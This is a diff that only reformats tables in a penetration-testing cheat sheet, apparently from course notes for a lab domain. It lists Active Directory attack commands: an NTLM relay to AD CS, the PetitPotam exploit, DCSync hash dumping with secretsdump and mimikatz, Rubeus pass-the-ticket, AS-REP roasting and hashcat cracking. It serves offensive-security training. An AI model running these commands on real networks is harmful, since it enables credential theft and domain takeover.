@@ -1193,18 +1193,18 @@ By leveraging the Wayback Machine, you can gain a historical perspective on your
 
 ### PetitPotam
 
-|Command|Description|
-|---|---|
-|`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host.|
-|`git clone https://github.com/topotam/PetitPotam.git`|Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host.|
-|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Used to execute the PetitPotam exploit by specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host.|
-|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`|Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host.|
-|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host.|
-|`klist`|`krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host.|
-|`python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Used to submit TGS requests using `getnthash.py` from a Linux-based host.|
-|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`|Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host.|
-|`.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`|Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host.|
-|`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`|Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host.|
+| Command                                                                                                                                                            | Description                                                                                                                                                                                 |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`               | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host.                                 |
+| `git clone https://github.com/topotam/PetitPotam.git`                                                                                                              | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host.                                                                                                        |
+| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`                                                                                                                    | Used to execute the PetitPotam exploit by specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
+| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`                                    | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host.                                                                           |
+| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`                                      | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host.                      |
+| `klist`                                                                                                                                                            | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host.                                                                                      |
+| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`                  | Used to submit TGS requests using `getnthash.py` from a Linux-based host.                                                                                                                   |
+| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host.                                            |
+| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`                                                                                            | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host.          |
+| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`                                                                                                            | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host.                                                                                                             |
 
 ### Miscellaneous Misconfigurations
 
@@ -1233,12 +1233,12 @@ By leveraging the Wayback Machine, you can gain a historical perspective on your
 
 ### ASREPRoasting
 
-|Command|Description|
-|---|---|
-|`Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl`|PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host.|
-|`.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`|Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host.|
-|`hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`|Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host.|
-|`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`|Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.|
+| Command                                                                                                  | Description                                                                                                                                                                             |
+| -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host.                           |
+| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`                                          | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host.                                                           |
+| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`                                      | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host.                                                               |
+| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`                               | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |
 
 ### Trust Relationships - Child > Parent Trusts
 
